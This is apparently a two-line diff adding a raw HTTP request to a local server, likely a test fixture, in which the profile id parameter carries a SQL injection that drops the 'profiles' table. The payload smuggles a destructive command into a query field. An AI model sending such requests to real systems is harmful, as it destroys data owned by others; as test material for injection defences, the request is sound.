@@ -1,0 +1,2 @@
+GET /profile?id=1;DROP%20TABLE%20profiles;-- HTTP/1.1
+Host: 127.0.0.1:8066
